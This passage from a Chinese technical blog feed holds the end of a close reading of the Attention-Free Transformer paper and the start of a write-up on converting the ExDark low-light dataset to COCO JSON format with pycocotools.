src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_iKrp4uek19.png"></p><p>从表4中，我们可以看到，在基本L&#x3D;12，d&#x3D;512架构的情况下，AFT实现了最低的每字符训练比特<code>bpc</code>，这是高模型容量的指标。它的测试性能比基本的Transformer稍差，但优于所有其他Transformer变体。AFT更深、更窄的体系结构在参数、速度、内存和性能方面取得了最佳平衡。它的测试<code>bpc</code>距离完整的Transformer只有0.024，而只消耗了三分之一的内存，并提供了44%的加速。AFT simple再次展示了具有竞争力的性能和卓越的效率。</p><h4 id="6-2-3-1-窗口大小"><a href="#6-2-3-1-窗口大小" class="headerlink" title="6.2.3.1 窗口大小"></a>6.2.3.1 窗口大小</h4><p>为了验证局部窗口大小的影响，我们对L&#x3D;24，d&#x3D;256架构进行了额外的实验，修复了所有问题，但改变了局部窗口大小。我们在表5中显示了结果，其中我们看到训练和测试<code>bpc</code>都形成了相对于窗口大小的U形，其中32个实现了最佳性能。这进一步证实了局部性确实是跨任务的有效归纳偏差。</p><p>表5：训练和测试<code>bpc</code>w.r.t.AFT本地窗口大小</p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_0QTfjZP_HR.png"></p><h4 id="6-2-3-2-较长的序列大小"><a href="#6-2-3-2-较长的序列大小" class="headerlink" title="6.2.3.2 较长的序列大小"></a>6.2.3.2 较长的序列大小</h4><p>我们还对AFT适应较长序列大小的能力感兴趣。由于其简单性，人们甚至可能预期随着T的增加性能会下降。为此，我们训练了AFT–local-32，L&#x3D;24，d&#x3D;256模型，T分别增加到2048和4096。结果如表6所示。我们看到，随着T的增加，AFT能够利用更大的序列大小，并持续降低训练和测试损失。</p><p>表6：<code>Enwik8</code>上的T增加。随着T的增加，训练和测试损失都有所改善</p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_pebJJtilJ7.png"></p><h2 id="6-3-图像分类"><a href="#6-3-图像分类" class="headerlink" title="6.3 图像分类"></a>6.3 图像分类</h2><h3 id="6-3-1-Imagenet-1K数据集"><a href="#6-3-1-Imagenet-1K数据集" class="headerlink" title="6.3.1 Imagenet-1K数据集"></a>6.3.1 Imagenet-1K数据集</h3><p><code>ImageNet</code>数据是CV领域非常出名的数据集，<code>ISLVRC</code>竞赛使用的数据集是轻量版的<code>ImageNet</code>数据集。<code>ISLVRC2012</code>是非常出名的一个数据集，在很多CV领域的论文，都会使用这个数据集对自己的模型进行测试。</p><p><code>ImageNet</code>是一个计算机视觉系统识别项目，是目前世界上图像识别最大的数据库。是美国斯坦福的计算机科学家，模拟人类的识别系统建立的。能够从图片中识别物体。<code>ImageNet</code>是一个非常有前景的研究项目，未来用在机器人身上，就可以直接辨认物品和人了。超过1400万的图像URL被<code>ImageNet</code>手动注释，以指示图片中的对象；</p><p>在至少一百万张图像中，还提供了边界框。<code>ImageNet</code>包含2万多个类别，一个典型的类别，如“气球”或“草莓”，每个类包含数百张图像。</p><p>在一些论文中，有的人会将这个数据叫成<code>ImageNet-1K</code> 或者<code>ISLVRC2012</code>，两者是一样的。<code>1K</code>代表的是1000个类别。用这个数据测试模型结构是很方便的。有几点原因：</p><ol><li>很多的论文都使用了此数据集，跟其他模型比较时，可以直接引用结果</li><li><code>ImageNet</code>的评价指标是固定的，大家都使用<code>top1</code>、<code>top5</code>等</li><li>可以直接看出你修改的模型结构到底有没有提高</li></ol><h3 id="6-3-2-实验部分"><a href="#6-3-2-实验部分" class="headerlink" title="6.3.2 实验部分"></a>6.3.2 实验部分</h3><p>然后，我们测试了AFT的non-causal版本，重点是图像分类任务。我们采用了Vision Transformer架构[5]，并在<code>Imagenet-1K</code>分类数据集上进行了实验。我们采用了<code>DeiT</code>[6]中的训练设置和超参数（批量大小、数据扩充、正则化和学习率调度）。</p><p>简言之，<code>ViT</code>将图像分割为16×16个不重叠的块，然后将具有共享权重的每个块线性投影到令牌嵌入的等价性。学习的类标记被附加到所得到的表示，从而产生长度$T&#x3D;1+\frac{H &#x2F; 16}{W &#x2F; 16}$的序列。线性分类头被附加到最终层的类标记以获得最终输出。有关型号配置的更多详细信息，请参见[5]。所有实验都是在<code>ImageNet-1K</code>数据集上进行的，没有使用额外的数据。</p><p>由于该任务中的序列大小相对较小（对于224×224的输入大小，T&#x3D;197），我们首先用AFT-full进行实验。因子分解后的位置偏移的隐藏维度被设置为$d’&#x3D;128$。</p><p>此外，我们还对AFT-conf进行了实验。在这种设置中，我们还取消了位置嵌入和类标记的使用，并在最终层的输出后应用全局平均池，然后将其输入到分类线性层。这种修改不仅简化了模型设计，而且使AFT-conv完全卷积，这是Transformer及其变体所没有的。</p><p>我们比较了两种baseline的Transformer配置，分别为“tiny”$(L&#x3D;12,d&#x3D;192,h&#x3D;3)$和“small”$(L&#x3D;12,d&#x3D;384,h&#x3D;6)$配置。我们还考虑了Lambda Networks[15]，它与线性化的注意力工作线密切相关。与<code>AFT-conv</code>类似，我们删除了类标记，转而应用全局平均池。我们使用了其公共实现，并应用密钥投影维度$|k|&#x3D;16$的全上下文模式（此设置调用更快的线性实现）。我们还将<code>BatchNorm</code>应用于查询，如[15]所建议的密钥投影。</p><blockquote><p>表7：<code>DeiT</code>[6]的Transformer架构的<code>Imagenet-1K</code>分类结果，<code>cropsize</code>为224。速度和内存消耗是在<code>V100</code>GPU的推理模式下测量的，批量大小为256</p></blockquote><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_bHE64y5803.png"></p><p>我们的结果如表7所示。我们首先看到，AFT-full在两种配置中都实现了与基线<code>Transformer DeiT</code>相当的性能，同时具有更好的内存占用和相似的速度。<code>AFT-conv</code>显著提高了两种配置的前1级精度（“tiny”和“small”分别提高了2%和1.1%的绝对精度），参数计数相似或更小。</p><p>与Lambda Networks相比，所有AFT变体都实现了相当或更好的精度，具有相当的速度和更小的内存占用。</p><h4 id="6-3-2-1-可视化"><a href="#6-3-2-1-可视化" class="headerlink" title="6.3.2.1 可视化"></a>6.3.2.1 可视化</h4><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_D_TNoeFjli.png"></p><blockquote><p>图1：具有可比规模的<code>AFT-conv</code>学习到的相对位置偏差。每一行代表一个层（层索引范围为{0,2,4,6,8,10}）；每列代表一个标题。有关更完整的版本，请参阅附录。</p></blockquote><p>我们还试图将<code>AFT-conv</code>学习到的位置偏差（精确地说是$exp(w)-1$）可视化，如图1所示。请注意，出现了有趣的局部对称稀疏模式。我们在附录中表明，我们可以正则化位置偏差以实现更高的稀疏性。我们还展示了<code>AFT-conv</code>的一个极端版本，其中每个头部都分配了一个非零上下文点，同时仍然保持良好的准确性。这有效地将卷积转换为索引。</p><h4 id="6-3-2-2-可变大小输入"><a href="#6-3-2-2-可变大小输入" class="headerlink" title="6.3.2.2 可变大小输入"></a>6.3.2.2 可变大小输入</h4><p><code>AFT-conv</code>是完全卷积的，这意味着它可以处理与训练中不同的输入大小。我们在384个更大的crop size上测试了<code>AFT-conv</code>模型（表7的最后一行，用crop size为224进行训练）。与最初的81.0相比，这提高了81.6的精度。这使得<code>AFT-conv</code>非常适合预训练微调工作流程，正如Vision任务中经常看到的那样。</p><h4 id="6-3-2-3-与Transformer的兼容性"><a href="#6-3-2-3-与Transformer的兼容性" class="headerlink" title="6.3.2.3 与Transformer的兼容性"></a>6.3.2.3 与Transformer的兼容性</h4><p>尽管AFT不是为了直接近似<code>MHA</code>而设计的，但它们确实有相当大的相似性，因为在两个模型中，值向量都是用学习到的非负权重聚合的。我们假设一个模型学习到的表征可以转移到另一个模型。为了测试这一点，我们获得了一个crop size为384的预训练<code>DeiT base</code>模型。然后，我们通过用<code>DeiT</code>模型的权重初始化<code>AFT-conv</code>来训练它，不包括位置嵌入、类标记、键和查询投影。我们使用64的批处理大小，训练模型100个迭代周期。作为控制，我们还为相同数量的epoch训练一个随机初始化的<code>AFT-conv</code>。结果如表8所示。有趣的是，我们看到<code>AFT-conv</code>的微调版本比随机初始化版本的精度高得多。由此产生的模型也比原始的<code>DeiT</code>模型更准确、更快、更节省内存。</p><blockquote><p>表8：根据384×384 crops的预训练<code>DeiT base</code>，对100个epochs的<code>AFT-conv</code>进行微调。“ft”和“rand”分别代表微调和随机初始化。</p></blockquote><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_Wvfp2uAv2k.png"></p><h4 id="6-3-2-4-全局连通性"><a href="#6-3-2-4-全局连通性" class="headerlink" title="6.3.2.4 全局连通性"></a>6.3.2.4 全局连通性</h4><p><code>AFT-conv</code>（以及<code>AFT-local</code>）保持全局连接，而不管本地kernel大小如何，这与稀疏和局部注意力工作不同。为了看到这种设计的好处，我们训练了一个<code>AFT-conv</code>的退化变体，其中我们修改了方程4，在局部窗口外为$w_{t,t’}$分配−∞值（求幂后为零权重）。当使用卷积核大小为7评估此基线时，它给出了79.9的Top 1精度，而默认<code>AFT-conv</code>在相同设置下的精度为80.8，下降了0.9%（我们在各种配置中始终观察到相同的趋势）。我们假设这项技术也可以扩展到局部和稀疏的变形金刚，但将作为未来的工作。</p><hr><h1 id="7-Conclusions"><a href="#7-Conclusions" class="headerlink" title="7 Conclusions"></a>7 Conclusions</h1><p>我们推出了无注意力Transformer，它以高效的新操作取代了点积注意力Transformer。我们在一组标准基准上展示了强大的结果以及卓越的效率。我们相信，我们的模型为类似Transformer的模型打开了一个新的设计空间，并将在需要自注意力的各个领域产生影响。</p><hr><h1 id="8-Additional-Ablations"><a href="#8-Additional-Ablations" class="headerlink" title="8 Additional Ablations"></a>8 Additional Ablations</h1><h2 id="8-1-其他的消融实验"><a href="#8-1-其他的消融实验" class="headerlink" title="8.1 其他的消融实验"></a>8.1 其他的消融实验</h2><p>我们对<code>ImageNet-1K</code>分类设置进行了更多实验。</p><p>$w$<strong>的参数化</strong>：我们首先验证了AFT全因子化参数化的重要性。如表9所示，AFT full的非因子化参数化比因子化版本的训练和测试性能更差。</p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_ZmxY5D-04j.png"></p><p>$w$<strong>的重参数化</strong>：对于<code>AFT-conv</code>，默认应用第3.2节中所述的重新参数化。我们验证了该设计有效地提高了模型的性能，如表10所示。</p><p><strong>卷积核的大小</strong>：我们还尝试了基于<code>AFT conv</code>small（384个头）改变局部窗口大小。结果如表11所示。请注意，即使内核大小非常小，为3×3，<code>AFT-conv</code>也能实现与<code>Deit</code>参考相当的性能。</p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_rOTuWHTAK9.png"></p><p><strong>query的贡献</strong>：查询项对AFT的计算贡献很小，但它对AFT性能的贡献很大。我们用<code>AFT-conv</code>（384个头，内核大小为11×11和15×15）进行了额外的实验，在那里我们删除了查询词。结果如表12所示。</p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_lFOlcx7Zm3.png"></p><p><strong>key的可视化</strong>：key在AFT中起着核心作用，因为它们为有效的上下文缩减提供了依赖于内容的重新加权。为了了解它们的行为，我们在<code>ImageNet-1K</code>验证集中的随机采样图像上可视化了<code>AFT-conv</code>模型的特征图，如图9、10、11、12所示。有趣的是，我们看到随着层级别的升高，密钥逐渐演变为“对象检测器”。</p><blockquote><p>图9、10、11、12顶部：来自<code>ImageNet-1K</code>验证集的示例图像<br>底部：<code>AFT-conv</code>中key的可视化，每行对应一个层，每列对应一个头部</p></blockquote><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_uuPTgG7Ppz.png"></p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_XJZU8tghzW.png"></p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_p19F5RiywO.png"></p><p><img src="/2024/07/27/%E8%AE%BA%E6%96%87%E7%B2%BE%E8%AF%BB1%EF%BC%9AAn-Attention-Free-Transformer/image_cLNORop0q6.png"></p>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AFT </tag>
            
            <tag> 论文精读 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024年X-Team夏令营考核任务2</title>
      <link href="/2024/07/26/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A12/"/>
      <url>/2024/07/26/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A12/</url>
      
        <content type="html"><![CDATA[<h1 id="1-exdark数据集"><a href="#1-exdark数据集" class="headerlink" title="1 exdark数据集"></a>1 exdark数据集</h1><p>低光数据集使用<code>ExDark</code>，该数据集是一个专门在低光照环境下拍摄出针对低光目标检测的数据集，包括从极低光环境到暮光环境等10种不同光照条件下的图片7363张，其中训练集5891张，测试集1472张，12个类别。</p><p><img src="/2024/07/26/2024%E5%B9%B4X-Team%E5%A4%8F%E4%BB%A4%E8%90%A5%E8%80%83%E6%A0%B8%E4%BB%BB%E5%8A%A12/image_41UAYltDNi.png"></p><hr><h1 id="2-加载数据集"><a href="#2-加载数据集" class="headerlink" title="2 加载数据集"></a>2 加载数据集</h1><h2 id="2-1-实现思路"><a href="#2-1-实现思路" class="headerlink" title="2.1 实现思路"></a>2.1 实现思路</h2><p><code>exdark</code>数据集中都是图片，看了一下原论文使用的<code>coco</code>数据集也都是图片，所以应该原论文代码中对数据集加载的代码应该可以用，但是需要修改一些地方。</p><p>原论文代码中加载数据集是使用的<code>json</code>格式，但是<code>exdark</code>数据集没有自带的<code>json</code>，所以可以先将标签之类的信息存储到一个<code>json</code>文件中。</p><p>不能直接使用了，因为源代码中使用了一个封装好的<code>coco</code>数据集类，但是我看了其中没有<code>exdark</code>数据集，所以相当于自己封装一个<code>exdark</code>数据集类吧，加油，一步一步来。</p><p>等一下，我突然想到一个问题，就是我把<code>exdark</code>数据集的格式搞得和<code>coco</code>数据集一样，那么我是不是就能用已经封装好的<code>coco</code>数据集类了？甚至直接使用<code>coco</code>类去加载<code>exdark</code>数据集。</p><h2 id="2-2-coco数据集json详解"><a href="#2-2-coco数据集json详解" class="headerlink" title="2.2 coco数据集json详解"></a>2.2 coco数据集<code>json</code>详解</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coco_json结构示意</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&#x27;info&#x27;</span>:info,</span><br><span class="line">    <span class="string">&#x27;licenses&#x27;</span>:[licenses],</span><br><span class="line">    <span class="string">&#x27;images&#x27;</span>:[image],</span><br><span class="line">    <span class="string">&#x27;annotations&#x27;</span>:[annotation]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1. <strong>images</strong>：这个部分包含了所有图像的信息。每个图像都表示为一个字典，包含以下字段： &#x20;</p><ul><li><code>id</code>：唯一标识图像的ID</li><li><code>file_name</code>：图像文件的文件名。 &#x20;</li><li><code>width</code>：图像宽度（以像素为单位）</li><li><code>height</code>：图像高度（以像素为单位）</li><li><code>license</code>：图像的许可证信息（可选）</li></ul><p>2. <strong>annotations</strong>：这个部分包含了与图像中对象实例分割相关的注释信息。每个注释表示为一个字典，包含以下字段： &#x20;</p><ul><li><code>id</code>：唯一标识注释的ID</li><li><code>image_id</code>：与注释相关联的图像的ID</li><li><code>category_id</code>：对象的类别ID，对应于categories部分中的类别</li><li><code>segmentation</code>：对象的分割掩码。通常表示为多边形或掩码的像素坐标&#x20;</li><li><code>area</code>：对象的像素面积</li><li><code>bbox</code>：对象的边界框，格式为<code>[x, y, width, height]</code></li><li><code>iscrowd</code>：标志位，指示对象是否是“杂乱”（例如，一群对象被视为单个对象）</li></ul><p>3. <strong>categories</strong>：这个部分包含了对象类别的信息。每个类别表示为一个字典，包含以下字段：&#x20;</p><ul><li><code>id</code>：唯一标识类别的ID。 &#x20;</li><li><code>name</code>：类别的名称。 &#x20;</li><li><code>supercategory</code>：类别的超类别，用于组织相关类别。</li></ul><p>4. <strong>info</strong>：这个部分包含了关于数据集的一般信息，如数据集名称、描述、版本等。</p><p>5. <strong>licenses</strong>：这个部分包含了与数据集许可相关的信息，如许可证名称、ID、URL等。</p><p>以下是一个简化的coco格式json示例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;images&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;file_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image1.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;width&quot;</span><span class="punctuation">:</span> <span class="number">640</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;height&quot;</span><span class="punctuation">:</span> <span class="number">480</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;file_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image2.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;width&quot;</span><span class="punctuation">:</span> <span class="number">800</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;height&quot;</span><span class="punctuation">:</span> <span class="number">600</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;annotations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;image_id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;category_id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;segmentation&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">[</span>x1<span class="punctuation">,</span> y1<span class="punctuation">,</span> x2<span class="punctuation">,</span> y2<span class="punctuation">,</span> ...<span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;area&quot;</span><span class="punctuation">:</span> <span class="number">1234</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bbox&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>x<span class="punctuation">,</span> y<span class="punctuation">,</span> width<span class="punctuation">,</span> height<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;iscrowd&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;image_id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;category_id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;segmentation&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">[</span>x1<span class="punctuation">,</span> y1<span class="punctuation">,</span> x2<span class="punctuation">,</span> y2<span class="punctuation">,</span> ...<span class="punctuation">]</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;area&quot;</span><span class="punctuation">:</span> <span class="number">567</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;bbox&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>x<span class="punctuation">,</span> y<span class="punctuation">,</span> width<span class="punctuation">,</span> height<span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;iscrowd&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;categories&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;person&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;supercategory&quot;</span><span class="punctuation">:</span> <span class="string">&quot;human&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;car&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;supercategory&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vehicle&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;info&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;COCO 2017 dataset&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;year&quot;</span><span class="punctuation">:</span> <span class="number">2017</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;contributor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Microsoft COCO group&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://cocodataset.org&quot;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;licenses&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="number">1</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CC BY-SA 2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://creativecommons.org/licenses/by-sa/2.0/&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>在<code>COCO</code>数据集的<code>annotations</code>字段中，<code>segmentation</code>字段用于描述对象实例的分割信息。</p><p><code>segmentation</code>字段的内容可以是多边形（polygon）或二进制掩码（mask），具体格式取决于数据集的标注方式。以下是关于<code>segmentation</code>字段的详细介绍：</p><p>（1）<strong>多边形表示（Polygon Representation）</strong></p><p>在COCO数据集中，segmentation字段通常以多边形的形式来表示对象实例的分割区域。多边形表示是一个列表，其中包含一系列坐标点，这些点按照顺序连接以形成多边形边界。坐标点的顺序是按照顺时针或逆时针方向排列的。</p><p>例如，<code>segmentation</code>字段的内容可以如下所示： &#x20;</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;segmentation&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">[</span>x1<span class="punctuation">,</span> y1<span class="punctuation">,</span> x2<span class="punctuation">,</span> y2<span class="punctuation">,</span> x3<span class="punctuation">,</span> y3<span class="punctuation">,</span> ...<span class="punctuation">]</span><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>其中，每对(x, y)表示一个多边形边界上的点坐标。这些坐标点按照顺时针或逆时针的顺序排列。</p><p>（2）<strong>二进制掩码表示（Binary Mask Representation）</strong></p><p>在某些情况下，COCO数据集也可以使用二进制掩码来表示对象实例的分割区域。二进制掩码是一个二维矩阵，其中每个像素都标识为前景（对象）或背景。通常，前景像素用1表示，背景像素用0表示。</p><p>例如，<code>segmentation</code>字段的内容可以如下所示： &#x20;</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;segmentation&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>  </span><br><span class="line"><span class="attr">&quot;size&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>height<span class="punctuation">,</span> width<span class="punctuation">]</span><span class="punctuation">,</span>  </span><br><span class="line"><span class="attr">&quot;counts&quot;</span><span class="punctuation">:</span> <span class="string">&quot;binary\_mask\_encoded&quot;</span>  </span><br><span class="line"><span class="punctuation">&#125;</span> </span><br></pre></td></tr></table></figure><p>其中，size字段包含掩码的高度和宽度，counts字段包含了用一种编码方式表示的二进制掩码。</p><p>在实例分割的<code>coco-json</code>中，annotations–segmentation以counts形式存储分割信息，且用到了<code>RLE</code>编码，因此利用segmentation存储的分割信息还需要进行<code>RLE</code>解码操作，这里可以利用<code>pycocotools</code>中的方法进行解码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pycocotools.mask <span class="keyword">as</span> mask_utils</span><br><span class="line"><span class="keyword">from</span> pycocotools.coco <span class="keyword">import</span> COCO</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取json</span></span><br><span class="line">coco = COCO(json_path)</span><br><span class="line">images_ids = coco.getImgIds()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 逐图像处理</span></span><br><span class="line"><span class="keyword">for</span> img_id <span class="keyword">in</span> images_ids:</span><br><span class="line">    img_info = coco.loadImgs(img_id)[<span class="number">0</span>]</span><br><span class="line">    ann_ids = coco.getAnnIds(imgIds=img_id)</span><br><span class="line">    anns = coco.loadAnns(ann_ids)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 逐实例处理</span></span><br><span class="line">    <span 